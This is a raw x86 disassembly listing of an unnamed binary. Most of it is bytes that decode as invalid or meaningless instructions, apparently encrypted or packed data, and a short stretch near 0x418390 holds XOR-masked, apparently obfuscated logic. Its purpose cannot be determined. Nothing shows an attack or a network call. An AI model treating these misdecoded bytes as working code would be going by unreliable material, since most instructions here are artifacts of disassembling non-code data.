  417cec:	(bad)  
  417ced:	cli    
  417cee:	push   eax
  417cef:	adc    al,0xd0
  417cf1:	and    eax,0x5cfa61f2
  417cf6:	and    al,0xab
  417cf8:	xlat   BYTE PTR ds:[ebx]
  417cf9:	repnz mov ecx,0x1f5369ed
  417cff:	fisttp DWORD PTR [ecx+0xb045ae3]
  417d05:	xchg   esi,eax
  417d06:	or     ecx,DWORD PTR [edx-0x33]
  417d09:	int3   
  417d0a:	repz pop es
  417d0c:	sub    esi,DWORD PTR [esi+0x898611d]
  417d12:	ror    BYTE PTR [ebp-0x3],cl
  417d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d16:	sbb    eax,0xa71c6f45
  417d1b:	loope  0x417d2d
  417d1d:	ds sbb eax,0x3cee93b
  417d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d24:	mov    ebp,0xf9309859
  417d29:	leave  
  417d2a:	outs   dx,DWORD PTR ds:[esi]
  417d2b:	adc    eax,0x58cf3656
  417d30:	xor    DWORD PTR [edx],eax
  417d32:	aam    0x91
  417d34:	mul    BYTE PTR [ecx-0x23]
  417d37:	imul   ebx,DWORD PTR [esi-0x5ed7895b],0xffffffc0
  417d3e:	jecxz  0x417cca
  417d40:	push   esi
  417d41:	pop    ebx
  417d42:	jns    0x417d36
  417d44:	loop   0x417d23
  417d46:	fsub   DWORD PTR [edi+0x1db5efd4]
  417d4c:	xor    eax,0x68efafc8
  417d51:	in     eax,dx
  417d52:	in     al,0xd1
  417d54:	fild   QWORD PTR [edi-0x34b635a8]
  417d5a:	mov    ds:0xd0fc9f63,al
  417d5f:	call   0x7fbc:0xd79f6733
  417d66:	outs   dx,BYTE PTR ds:[esi]
  417d67:	mov    BYTE PTR [ecx+0x519f73ea],dl
  417d6d:	in     eax,dx
  417d6e:	and    eax,0x6cf77eaa
  417d73:	data16 xlat BYTE PTR ds:[ebx]
  417d75:	push   esp
  417d76:	and    eax,0xf6a9c432
  417d7b:	cmp    eax,0x29e345f4
  417d80:	fidivr DWORD PTR [edx-0xfbf7ae]
  417d86:	retf   0x7b6e
  417d89:	imul   eax,esi,0x8a4a9f66
  417d8f:	popf   
  417d90:	dec    ebp
  417d91:	jge    0x417d9e
  417d93:	pop    DWORD PTR [esp+ebx*4]
  417d96:	mov    BYTE PTR [edi],cl
  417d98:	loop   0x417d20
  417d9a:	dec    eax
  417d9b:	(bad)  [ecx]
  417d9d:	mov    esp,0xfd378a44
  417da2:	pop    ss
  417da3:	inc    di
  417da5:	cs pop ebp
  417da7:	sub    BYTE PTR [ebx],bh
  417da9:	imul   ebp,edx,0xffffffa9
  417dac:	out    dx,eax
  417dad:	in     eax,dx
  417dae:	mov    ebx,fs
  417db0:	push   es
  417db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417db2:	les    edi,FWORD PTR [edi+0x4bfe2633]
  417db8:	xor    eax,0x3ec7af58
  417dbd:	rcr    edx,1
  417dbf:	xchg   esp,eax
  417dc0:	les    edx,FWORD PTR [ebp+0x1b4ee42a]
  417dc6:	inc    ebp
  417dc7:	jg     0x417d9d
  417dc9:	pop    ebx
  417dca:	adc    DWORD PTR [edi],eax
  417dcc:	sahf   
  417dcd:	mov    ebx,0x5e0512c1
  417dd2:	cmp    DWORD PTR [ecx],edi
  417dd4:	into   
  417dd5:	or     DWORD PTR [eax+edx*2+0x1023be38],0x48
  417ddd:	mov    ebx,0x1db330be
  417de2:	sub    DWORD PTR [eax-0xec80661],ecx
  417de8:	lds    eax,FWORD PTR gs:[ecx+0x30]
  417dec:	mov    ecx,DWORD PTR ds:0xa99adc2e
  417df2:	dec    ecx
  417df3:	jmp    0xa1b9:0x5919fa16
  417dfa:	ret    0x5045
  417dfd:	fwait
  417dfe:	loope  0x417de5
  417e00:	test   DWORD PTR [edi],0x11610326
  417e06:	pop    ss
  417e07:	sar    BYTE PTR [esi+0x60],cl
  417e0a:	add    DWORD PTR [eax],ebp
  417e0c:	jnp    0x417e6b
  417e0e:	scas   al,BYTE PTR es:[edi]
  417e0f:	repnz xchg ebx,eax
  417e11:	lahf   
  417e12:	hlt    
  417e13:	dec    esp
  417e14:	outs   dx,BYTE PTR ds:[esi]
  417e15:	or     bl,ah
  417e17:	cmp    eax,0x295b6885
  417e1c:	jae    0x417db5
  417e1e:	popf   
  417e1f:	jae    0x417e09
  417e21:	mov    ch,0x97
  417e23:	mov    ch,0xe6
  417e25:	(bad)  
  417e26:	(bad)  
  417e27:	mov    bl,0xa7
  417e29:	mov    ecx,DWORD PTR [ecx+edi*4]
  417e2c:	mov    ebx,0xa93c6b9a
  417e31:	or     esp,DWORD PTR [esi-0x62]
  417e34:	push   ebx
  417e35:	lahf   
  417e36:	and    dh,0xe0
  417e39:	addr16 xchg esi,eax
  417e3b:	xor    eax,0xc3e636be
  417e40:	mov    esp,0x98894896
  417e45:	pushf  
  417e46:	cmp    al,0xcd
  417e48:	(bad)  
  417e49:	repz mov ebx,0xf23ac81e
  417e4f:	imul   edi,DWORD PTR [ecx],0x4b
  417e52:	inc    esp
  417e53:	mov    ss,ecx
  417e55:	inc    BYTE PTR ds:0xdfac6129
  417e5b:	and    esp,esp
  417e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e5e:	and    edx,DWORD PTR [eax+ecx*2]
  417e61:	in     al,dx
  417e62:	ins    BYTE PTR es:[edi],dx
  417e63:	add    eax,0x5de72675
  417e68:	cmp    eax,0xc4fee7c5
  417e6d:	jne    0x417e23
  417e6f:	bound  ecx,QWORD PTR [esi+esi*4+0x40]
  417e73:	mov    edi,ecx
  417e75:	data16 not BYTE PTR [edi+0x66dbf447]
  417e7c:	inc    edx
  417e7d:	mov    gs,WORD PTR [edx]
  417e7f:	fnstsw WORD PTR [edi]
  417e81:	repz les edi,FWORD PTR [eax+0x64]
  417e85:	add    bh,BYTE PTR [bp+si-0x3c9c]
  417e8a:	lock jecxz 0x417ee6
  417e8d:	jns    0x417e47
  417e8f:	(bad)  
  417e91:	cmp    al,0x34
  417e93:	cmp    eax,0x4363000
  417e98:	fistp  DWORD PTR [ebx]
  417e9a:	jmp    0xf63f81a9
  417e9f:	ins    DWORD PTR es:[edi],dx
  417ea0:	xchg   ch,dh
  417ea2:	js     0x417e47
  417ea4:	cwde   
  417ea5:	cmp    BYTE PTR [esi-0x1f0b83a2],cl
  417eab:	push   esi
  417eac:	iret   
  417ead:	adc    BYTE PTR [edi],0xa
  417eb0:	out    0xfb,eax
  417eb2:	fnstenv [ebp+0x7a]
  417eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eb6:	aaa    
  417eb7:	adc    bh,BYTE PTR [edi+ebx*2]
  417eba:	cli    
  417ebb:	jae    0x417ea0
  417ebd:	das    
  417ebe:	or     eax,0x41874337
  417ec3:	sbb    al,0xc
  417ec5:	pop    ebx
  417ec6:	cmp    al,0x81
  417ec8:	out    0x22,eax
  417eca:	cdq    
  417ecb:	fsubr  DWORD PTR [ecx-0x3ddb7f6e]
  417ed1:	or     al,0xcf
  417ed3:	mov    al,0x21
  417ed5:	pop    edx
  417ed6:	cmp    dl,ch
  417ed8:	push   es
  417ed9:	mov    eax,DWORD PTR [ebp-0x69529c7e]
  417edf:	xor    al,BYTE PTR [eax]
  417ee1:	rcr    DWORD PTR [ebp+0x7f],0x68
  417ee5:	push   ecx
  417ee6:	loope  0x417f39
  417ee8:	pop    ss
  417ee9:	pop    esi
  417eea:	fwait
  417eeb:	shl    ch,cl
  417eed:	sub    ebp,DWORD PTR [edx+0x34]
  417ef0:	fcomp  QWORD PTR [ecx]
  417ef2:	jae    0x417f2a
  417ef4:	xchg   ecx,eax
  417ef5:	and    eax,0x9329e738
  417efa:	xlat   BYTE PTR ds:[ebx]
  417efb:	enter  0xa9bb,0x27
  417eff:	pop    ecx
  417f00:	ins    BYTE PTR es:[edi],dx
  417f01:	push   eax
  417f02:	inc    esp
  417f03:	pop    ss
  417f04:	adc    al,BYTE PTR [edx]
  417f06:	and    DWORD PTR [ebp+0x2c],esi
  417f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f0a:	repnz mov BYTE PTR [edi-0x347891f8],ch
  417f11:	(bad)  
  417f12:	jno    0x417eb8
  417f14:	(bad)  [edx]
  417f16:	les    edi,FWORD PTR [edx+0x1]
  417f19:	adc    DWORD PTR [edi+0x4c],ebx
  417f1c:	hlt    
  417f1d:	cwde   
  417f1e:	push   ds
  417f1f:	cli    
  417f20:	(bad)  
  417f21:	lods   eax,DWORD PTR ds:[esi]
  417f22:	mov    esp,0x77c66539
  417f27:	neg    ebp
  417f29:	xor    al,0xad
  417f2b:	sbb    eax,0xbd34a97c
  417f30:	jmp    0x417f89
  417f32:	push   esi
  417f33:	repz cmp DWORD PTR [edx],0x6a
  417f37:	dec    eax
  417f38:	inc    esp
  417f39:	ins    BYTE PTR es:[edi],dx
  417f3a:	sbb    al,0x12
  417f3c:	add    al,0x60
  417f3e:	push   ebx
  417f3f:	add    bh,bh
  417f41:	xor    esi,DWORD PTR [eax+0x65902cbb]
  417f47:	push   ebp
  417f48:	jle    0x417efd
  417f4a:	mov    cl,0xa7
  417f4c:	inc    eax
  417f4d:	iret   
  417f4e:	(bad)  
  417f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f51:	dec    ebx
  417f52:	sbb    edx,ecx
  417f54:	sub    BYTE PTR [ebp+0x5e],ch
  417f57:	mov    cl,0x43
  417f59:	xchg   esp,eax
  417f5a:	rcl    DWORD PTR [edx+0x1bffc301],1
  417f60:	xor    edi,DWORD PTR [ecx-0x6c]
  417f63:	mov    ds:0x292fa217,eax
  417f68:	into   
  417f69:	adc    eax,0x973245e2
  417f6e:	jge    0x417fa5
  417f70:	mov    WORD PTR [eax-0x6b],fs
  417f73:	es dec ebx
  417f75:	pushf  
  417f76:	mov    ah,BYTE PTR [edx-0x66aa5361]
  417f7c:	mov    al,ds:0xb9f04102
  417f81:	daa    
  417f82:	adc    DWORD PTR [edi+edi*4-0x12],0xc59383f4
  417f8a:	push   edi
  417f8b:	mov    DWORD PTR [edi],0xc2cf9a09
  417f91:	jl     0x417f33
  417f93:	pop    DWORD PTR [ecx-0x214e9898]
  417f99:	cmp    BYTE PTR [esi-0x5d],ah
  417f9c:	push   es
  417f9d:	xchg   dh,cl
  417f9f:	add    DWORD PTR [edx+0xf],ebp
  417fa2:	ret    0x1e98
  417fa5:	jae    0x417fa9
  417fa7:	in     al,dx
  417fa8:	loopne 0x417f6c
  417faa:	and    eax,0xa0826f71
  417faf:	push   edx
  417fb0:	jo     0x417f3a
  417fb2:	and    BYTE PTR [edx+0x19127d7d],0x8f
  417fb9:	retf   0xa736
  417fbc:	lds    ebp,FWORD PTR [edi-0x4133f063]
  417fc2:	add    DWORD PTR [edx],esi
  417fc4:	mov    BYTE PTR [esi+0x4c],al
  417fc7:	dec    esp
  417fc8:	pusha  
  417fc9:	adc    al,0xf7
  417fcb:	inc    ebp
  417fcc:	int    0x5f
  417fce:	jbe    0x418030
  417fd0:	or     cl,ch
  417fd2:	adc    DWORD PTR [ebx],ebx
  417fd4:	(bad)  
  417fd5:	mov    esp,0x95809c09
  417fda:	mov    edi,DWORD PTR [edi+0x49ea70a8]
  417fe0:	retf   0xe41a
  417fe3:	or     eax,0xecbf1ace
  417fe8:	pop    ebx
  417fe9:	loope  0x417fa7
  417feb:	jo     0x417fec
  417fed:	jbe    0x418056
  417fef:	push   ebx
  417ff0:	nop
  417ff1:	add    DWORD PTR ds:0xd0580442,ecx
  417ff7:	sar    DWORD PTR [esi-0x3ef33cc5],0x96
  417ffe:	loopne 0x417ff5
  418000:	xchg   DWORD PTR [esi+ecx*8+0x1e],eax
  418004:	ds call 0x51c2:0xc214fe15
  41800c:	or     BYTE PTR [eax-0x1e998d11],al
  418012:	jne    0x418039
  418014:	xor    eax,0xab118f37
  418019:	inc    ebp
  41801a:	jbe    0x417f9e
  41801c:	adc    DWORD PTR [eax-0x75],0x7e
  418020:	xchg   WORD PTR [esi],sp
  418023:	add    BYTE PTR [ecx],ch
  418025:	pop    edi
  418026:	les    eax,FWORD PTR [ebx]
  418028:	test   al,0xc2
  41802a:	add    bh,BYTE PTR [edx]
  41802c:	fwait
  41802d:	test   eax,0xc171f5e9
  418032:	das    
  418033:	cmp    BYTE PTR [eax+ebx*2-0x3a3b5f89],dl
  41803a:	out    0xd4,eax
  41803c:	mov    fs,WORD PTR [edx+0x4a84c2e3]
  418042:	mov    al,0x7f
  418044:	and    bl,BYTE PTR [edi+edx*2-0x1c]
  418048:	scas   eax,DWORD PTR es:[edi]
  418049:	cld    
  41804a:	jbe    0x418010
  41804c:	jnp    0x418040
  41804e:	pop    ss
  41804f:	imul   edx
  418051:	sbb    dh,BYTE PTR [ebx]
  418053:	retf   0xc509
  418056:	jle    0x41806d
  418058:	or     ah,BYTE PTR [esi+eiz*1]
  41805b:	pop    ss
  41805c:	mov    bh,BYTE PTR [edx+0x4f]
  41805f:	aad    0xf5
  418061:	pop    es
  418062:	xor    ecx,DWORD PTR [esi+0x4e]
  418065:	mov    al,ds:0xc508e32b
  41806a:	cmc    
  41806b:	jns    0x4180a0
  41806d:	push   edx
  41806e:	repnz leave 
  418070:	xchg   esi,eax
  418071:	sub    bl,BYTE PTR [ebp-0x20]
  418074:	(bad)  
  418075:	ficomp DWORD PTR [ebx+esi*2+0x33e42957]
  41807c:	jbe    0x418011
  41807e:	mov    ebx,0xe219f32b
  418083:	mov    eax,ds:0x7fb711fb
  418088:	xchg   ecx,eax
  418089:	sub    BYTE PTR [edi],dl
  41808b:	shl    BYTE PTR [eax+ebx*2-0x7d9cccd2],1
  418092:	push   eax
  418093:	sub    dl,dh
  418095:	mov    ds:0xaf6449b6,eax
  41809a:	xchg   edi,eax
  41809b:	in     al,0x82
  41809d:	and    al,0x37
  41809f:	push   edi
  4180a0:	push   0x11
  4180a2:	push   ebp
  4180a3:	push   esi
  4180a4:	xor    edi,DWORD PTR [edx+ecx*1-0x23fa9606]
  4180ab:	sub    esi,edx
  4180ad:	scas   al,BYTE PTR es:[edi]
  4180ae:	dec    edx
  4180af:	loopne 0x418085
  4180b1:	push   edx
  4180b2:	adc    eax,0xc9636288
  4180b7:	in     al,0x8
  4180b9:	fmul   st,st(3)
  4180bb:	outs   dx,BYTE PTR ds:[esi]
  4180bc:	mov    ah,0x66
  4180be:	add    dl,BYTE PTR [ebx+0x3b]
  4180c1:	ins    DWORD PTR es:[edi],dx
  4180c2:	push   esi
  4180c3:	jbe    0x41813b
  4180c5:	inc    ecx
  4180c6:	gs call 0x4426:0x6003bf49
  4180ce:	call   0x67ce:0x5a97e145
  4180d5:	hlt    
  4180d6:	loope  0x4180a0
  4180d8:	(bad)  
  4180d9:	lods   eax,DWORD PTR ds:[esi]
  4180da:	jae    0x4180cf
  4180dc:	rcl    DWORD PTR [eax-0x4],cl
  4180df:	pop    edx
  4180e0:	fldenv [eax+0x30]
  4180e3:	push   ecx
  4180e4:	lahf   
  4180e5:	cmp    BYTE PTR [esp+eax*8],bh
  4180e8:	shr    BYTE PTR [ebx+0x3ab95946],0xb4
  4180ef:	es dec edx
  4180f1:	cmp    al,0x2e
  4180f3:	daa    
  4180f4:	inc    ebp
  4180f5:	lods   al,BYTE PTR ds:[esi]
  4180f6:	jmp    0x68b4dbb1
  4180fb:	arpl   WORD PTR [ebp+0xa652db2],di
  418101:	mov    al,ds:0xffa5658e
  418106:	stos   DWORD PTR es:[edi],eax
  418107:	das    
  418108:	retf   
  418109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41810a:	mov    al,ds:0x4ff7726b
  41810f:	jno    0x418152
  418111:	inc    ebp
  418112:	inc    edx
  418113:	(bad)  
  418114:	pop    ds
  418115:	stos   BYTE PTR es:[edi],al
  418116:	and    eax,0x3d06c6d5
  41811b:	fistp  WORD PTR [ebp+0x3a7bbcc4]
  418121:	push   esp
  418122:	sub    BYTE PTR fs:[edi-0x30],0xe0
  418127:	adc    al,BYTE PTR [ecx-0x4d]
  41812a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41812b:	push   cs
  41812c:	cwde   
  41812d:	(bad)  
  41812e:	cmp    DWORD PTR [eax+0x4d],edi
  418131:	cwde   
  418132:	out    0x3e,eax
  418134:	cwde   
  418135:	cmp    bh,ch
  418137:	adc    al,0x22
  418139:	dec    eax
  41813a:	js     0x418129
  41813c:	cdq    
  41813d:	cmp    DWORD PTR [ebx],esp
  41813f:	add    bl,BYTE PTR [eax-0x68b9a140]
  418145:	add    BYTE PTR [esp+edx*1-0x35],ch
  418149:	rcr    DWORD PTR [esi+ebp*2],cl
  41814c:	cli    
  41814d:	cld    
  41814e:	mov    ?,edx
  418150:	jl     0x418187
  418152:	mov    DWORD PTR [ecx],ebp
  418154:	loope  0x418119
  418156:	popa   
  418157:	mov    ?,WORD PTR [esi+ebx*1-0x67]
  41815b:	adc    eax,0xb23e909f
  418160:	imul   esi,DWORD PTR [ebp-0x55],0x20169be2
  418167:	add    BYTE PTR [eax+0x186fda90],ch
  41816d:	mov    eax,0x77f95189
  418172:	mov    cl,0xe2
  418174:	fdiv   st(5),st
  418176:	sub    al,0xe5
  418178:	adc    al,0x5d
  41817a:	outs   dx,DWORD PTR ds:[esi]
  41817b:	(bad)  
  41817c:	sti    
  41817d:	shl    BYTE PTR [ebp-0x659daddc],0xa1
  418184:	js     0x41813d
  418186:	xor    esp,DWORD PTR [ebp+0x3b]
  418189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41818a:	inc    ebp
  41818b:	fbstp  TBYTE PTR [esi+edi*8]
  41818e:	fstp   DWORD PTR [eax-0xe]
  418191:	jns    0x4181c3
  418193:	sti    
  418194:	idiv   DWORD PTR [ebp+esi*1+0x7cbddad9]
  41819b:	pop    esi
  41819c:	dec    esp
  41819d:	dec    esp
  41819e:	jle    0x418141
  4181a0:	and    eax,0xd9f4e372
  4181a5:	scas   eax,DWORD PTR es:[edi]
  4181a6:	cmp    ecx,0xffffffb5
  4181a9:	dec    edi
  4181aa:	push   fs
  4181ac:	and    al,0x75
  4181ae:	xchg   ebp,eax
  4181af:	shl    DWORD PTR [edi],0x43
  4181b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181b3:	add    BYTE PTR [edi-0x3ddc0447],dh
  4181b9:	mov    cl,0x37
  4181bb:	int3   
  4181bc:	jp     0x418228
  4181be:	sbb    DWORD PTR [edi+ebp*8-0x72fd3e75],0x7e
  4181c6:	inc    esp
  4181c7:	aaa    
  4181c8:	sbb    al,0xb7
  4181ca:	inc    ebp
  4181cb:	cmp    eax,0x439b7227
  4181d0:	add    BYTE PTR [edi-0x64],bl
  4181d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181d4:	imul   edx,esi,0x66
  4181d7:	mov    edx,0xc21903bb
  4181dc:	jo     0x418161
  4181de:	mov    ebx,0xb040af3d
  4181e3:	pop    edx
  4181e4:	mov    eax,0x68ea506b
  4181e9:	test   al,0xf5
  4181eb:	fidiv  DWORD PTR [esi+0x73c5d620]
  4181f1:	or     al,0x2d
  4181f3:	fs jle 0x4181dc
  4181f6:	cmp    esp,DWORD PTR [ebx+edx*1]
  4181f9:	xchg   DWORD PTR [edi-0x1c],edx
  4181fc:	jae    0x418252
  4181fe:	stos   DWORD PTR es:[edi],eax
  4181ff:	mov    ds:0x98c77446,eax
  418204:	inc    esi
  418205:	aad    0x72
  418207:	dec    ecx
  418208:	and    al,0x4c
  41820a:	push   ecx
  41820b:	scas   al,BYTE PTR es:[edi]
  41820c:	std    
  41820d:	(bad)  
  41820e:	rol    DWORD PTR [edi+ebx*8-0x28001b9d],0x39
  418216:	adc    al,0x61
  418218:	sbb    dh,cl
  41821a:	mov    BYTE PTR [ebp-0x69a6a2fe],bl
  418220:	int    0xff
  418222:	pop    ds
  418223:	test   esp,edx
  418225:	inc    ebp
  418226:	hlt    
  418227:	in     al,dx
  418228:	fcomp  QWORD PTR [ecx+0xa]
  41822b:	fnstenv [esi-0x36ed7868]
  418231:	loopne 0x41823d
  418233:	xchg   ebx,eax
  418234:	and    BYTE PTR [ecx-0x49],bl
  418237:	sub    eax,0x3c283d28
  41823c:	ins    DWORD PTR es:[edi],dx
  41823d:	xor    eax,0xc5d24723
  418242:	inc    edx
  418243:	and    DWORD PTR [esi-0x78],edi
  418246:	xchg   ecx,eax
  418247:	xor    BYTE PTR ds:0xb46aed2e,al
  41824d:	call   0x9beb61d6
  418252:	inc    ebx
  418253:	scas   eax,DWORD PTR es:[edi]
  418254:	(bad)  
  418255:	and    dl,BYTE PTR [edx+0x11]
  418258:	jae    0x418288
  41825a:	adc    BYTE PTR [edi+eax*1+0x4811f6aa],dh
  418261:	mov    bl,0x59
  418263:	xor    ch,BYTE PTR [edx]
  418265:	fsin   
  418267:	xchg   DWORD PTR [edi],edi
  418269:	cmp    BYTE PTR [eax-0x38449efc],dh
  41826f:	sbb    ebx,DWORD PTR [ecx]
  418271:	pop    ebp
  418272:	je     0x418253
  418274:	pushf  
  418275:	and    bl,bl
  418277:	mov    eax,ds:0xd2820a6b
  41827c:	push   edx
  41827d:	mov    al,ds:0x58caeb51
  418282:	fnstsw WORD PTR [edx]
  418284:	test   ecx,0x5a68b00b
  41828a:	xchg   edi,eax
  41828b:	rol    DWORD PTR [ebx-0x3f88e057],1
  418291:	sbb    WORD PTR [bp+0x4e7d],sp
  418297:	es call 0xa232:0x96cde09d
  41829f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182a0:	in     eax,0xed
  4182a2:	ds xor ecx,esp
  4182a5:	das    
  4182a6:	inc    edx
  4182a7:	inc    ecx
  4182a8:	outs   dx,BYTE PTR ds:[esi]
  4182a9:	shl    esp,0xd0
  4182ac:	nop
  4182ad:	xor    DWORD PTR [eax-0x5f],ebx
  4182b0:	adc    eax,0xd93ae35f
  4182b5:	std    
  4182b6:	jecxz  0x4182da
  4182b8:	aas    
  4182b9:	imul   ecx,DWORD PTR [esi],0x49d528ff
  4182bf:	cdq    
  4182c0:	push   ebx
  4182c1:	out    dx,al
  4182c2:	js     0x41826b
  4182c4:	into   
  4182c5:	test   DWORD PTR [ebx],ebp
  4182c7:	pushf  
  4182c8:	xor    esp,DWORD PTR [ebp-0x4f]
  4182cb:	rcr    BYTE PTR [esi],0x3b
  4182ce:	inc    edi
  4182cf:	adc    cx,WORD PTR [eax+esi*1-0x5b]
  4182d4:	or     al,0xe
  4182d6:	sub    eax,0xd37f142e
  4182db:	dec    cl
  4182dd:	dec    edi
  4182de:	in     al,0x5a
  4182e0:	add    eax,0x20ed41c5
  4182e5:	jmp    0x418273
  4182e7:	mov    cl,0x42
  4182e9:	and    BYTE PTR [edi],ch
  4182eb:	fld    DWORD PTR [edx+0x4a]
  4182ee:	xor    al,0xaf
  4182f0:	mov    bh,0xd3
  4182f2:	and    esp,0x9b00e123
  4182f8:	bound  ebx,QWORD PTR [ebp+0x1c929705]
  4182fe:	push   ebx
  4182ff:	jb     0x418286
  418301:	pop    ebx
  418302:	call   DWORD PTR [ebp-0x65]
  418305:	fistp  WORD PTR ds:0x8d243d67
  41830b:	and    ebp,DWORD PTR [edi+0x59]
  41830e:	pop    esp
  41830f:	sti    
  418310:	scas   al,BYTE PTR es:[edi]
  418311:	(bad)
  418314:	add    cl,BYTE PTR [ebp+0x54]
  418317:	ret    0x71cf
  41831a:	(bad)  
  41831c:	and    eax,DWORD PTR [ecx]
  41831e:	add    esp,esi
  418320:	pop    ds
  418321:	stos   BYTE PTR es:[edi],al
  418322:	and    dh,ah
  418324:	test   DWORD PTR [ecx+0x352934c9],eax
  41832a:	scas   eax,DWORD PTR es:[edi]
  41832b:	popf   
  41832c:	jmp    0x418315
  41832e:	test   DWORD PTR [ebp-0x4d7833e4],esi
  418334:	jb     0x418394
  418336:	jge    0x4182df
  418338:	adc    al,0x25
  41833a:	push   ds
  41833b:	lods   al,BYTE PTR ds:[esi]
  41833c:	and    edx,DWORD PTR [ecx-0x1d]
  41833f:	mov    ch,0x62
  418341:	push   ebp
  418342:	sub    al,0x9a
  418344:	shl    BYTE PTR [esi-0x17],cl
  418347:	lds    esi,FWORD PTR [ecx-0x69]
  41834a:	jmp    0xaa34b45d
  41834f:	add    cl,BYTE PTR ds:0x2ba3fae
  418355:	sub    al,0x6a
  418357:	shr    DWORD PTR [ebp+0x7f],1
  41835a:	arpl   WORD PTR ds:0xfe253371,dx
  418360:	inc    edi
  418361:	mov    ds:0x80f4f7cf,eax
  418366:	jo     0x418387
  418368:	cmp    BYTE PTR [edi],cl
  41836a:	xor    bl,BYTE PTR [esi]
  41836c:	push   ecx
  41836d:	cdq    
  41836e:	outs   dx,DWORD PTR ds:[esi]
  41836f:	sbb    bh,BYTE PTR ds:0xd9f4acf2
  418375:	mov    esp,0x91db20fd
  41837a:	dec    ebx
  41837b:	mov    ebp,0xec43a33
  418380:	inc    edi
  418381:	mov    di,0x6ea2
  418385:	pushw  0xf
  418388:	test   ecx,esi
  41838a:	mov    eax,0x558bffff
  41838f:	hlt    
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	fwait
  41848c:	and    BYTE PTR [edx-0x4],ah
  41848f:	int3   
  418490:	xor    BYTE PTR [ebp+0x7c],bh
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	das    
  418498:	cdq    
  418499:	push   0xffffffde
  41849b:	adc    DWORD PTR [bx-0x7a84],ebp
  4184a0:	inc    ebp
  4184a1:	xlat   BYTE PTR ds:[ebx]
  4184a2:	je     0x4184ca
  4184a4:	dec    si
  4184a6:	inc    edi
  4184a7:	push   esi
  4184a8:	xchg   edi,eax
  4184a9:	pop    ebx
  4184aa:	retf   
  4184ab:	mov    bl,0x18
  4184ad:	in     al,dx
  4184ae:	add    DWORD PTR [eax],ecx
  4184b0:	outs   dx,DWORD PTR ds:[esi]
  4184b1:	pop    ecx
  4184b2:	pop    ds
  4184b3:	mov    ds:0x60bbfc7e,al
  4184b8:	adc    BYTE PTR [ebp+ecx*2-0x15],cl
  4184bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184bd:	mov    dh,0xc9
